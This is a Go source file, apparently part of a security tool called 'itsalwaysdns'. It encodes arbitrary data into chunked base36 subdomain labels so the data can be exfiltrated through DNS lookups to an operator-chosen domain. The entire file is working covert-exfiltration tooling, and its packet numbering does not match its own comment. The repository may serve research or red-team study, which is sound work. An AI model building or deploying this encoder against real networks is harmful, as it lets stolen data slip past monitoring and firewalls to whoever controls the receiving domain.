package messageencoding

import (
	"fmt"
	"github.com/sam-bee/security-itsalwaysdns/shared/codec"
	"math/rand"
	"strings"
)

type dataToExfil struct {
	payload    string
	mainDomain string
	batchId    string
}

type ExfilPacket struct {
	batchId    string    // uuid
	packetNo   int       // incrementing number
	payload    [3]string // 3 x up to 63 chars of payload in base 36
	mainDomain string    // like 'example.com'
}

// Exfil packets have multiple layers of subdomains. The leftmost one is metadata. The next three are payload chunks.
// 40 byte payload chunks convert to 62 chars of base36 characters. The limit for a subdomain in the spec is 63 bytes.
const packetPayloadSize = 120
const packetPayloadChunkSize = 40

func GetDomainsToLookUp(payload string, mainDomain string) []string {
	exfilPackets := encodeDataToExfilPackets(payload, mainDomain)
	var domains []string
	for _, ep := range exfilPackets {
		domains = append(domains, ep.ToFqdn())
	}
	return domains
}

func encodeDataToExfilPackets(payload string, mainDomain string) []ExfilPacket {
	dataToExfil := dataToExfil{
		payload:    payload,
		mainDomain: mainDomain,
		batchId:    fmt.Sprintf("%x", rand.Intn(16777216)),
	}
	return convertToExfilPackets(dataToExfil)
}

func (ep *ExfilPacket) ToFqdn() string {
	payloadWithDots := strings.Join(ep.payload[:], ".")
	payloadWithDots = strings.TrimRight(payloadWithDots, ".")
	return fmt.Sprintf("%s-%d.%s.%s", ep.batchId, ep.packetNo, payloadWithDots, ep.mainDomain)
}

// Turning a string of up to 120 characters into a single exfil packet
func newExfilPacketFromPayload(
	batchId string,
	packetNo int,
	payloadContent string,
	mainDomain string,
) (ExfilPacket, error) {

	ep := ExfilPacket{
		batchId:    batchId,
		packetNo:   packetNo,
		mainDomain: mainDomain,
	}

	payload := []byte(payloadContent)

	strlen := len(payload)

	if strlen == 0 {
		return ep, fmt.Errorf("payload cannot be nil")
	}

	if strlen > packetPayloadSize {
		return ep, fmt.Errorf("payload cannot be longer than %d bytes", packetPayloadSize)
	}

	for i := 0; i <= 2; i++ {
		if strlen > packetPayloadChunkSize*i {
			start := packetPayloadChunkSize * i
			end := min(strlen, packetPayloadChunkSize*(i+1))
			ep.payload[i] = codec.StringToBase36(payload[start:end])
		}
	}

	return ep, nil
}

func convertToExfilPackets(data dataToExfil) []ExfilPacket {
	packets := make([]ExfilPacket, 0)

	// Convert the data to a byte array
	dataBytes := []byte(data.payload)

	// Split the data into chunks of 120 characters
	for i := 0; i < len(dataBytes); i += packetPayloadSize {
		end := i + packetPayloadSize
		if end > len(dataBytes) {
			end = len(dataBytes)
		}

		packet, _ := newExfilPacketFromPayload(data.batchId, i, string(dataBytes[i:end]), data.mainDomain)
		packets = append(packets, packet)
	}

	return packets
}
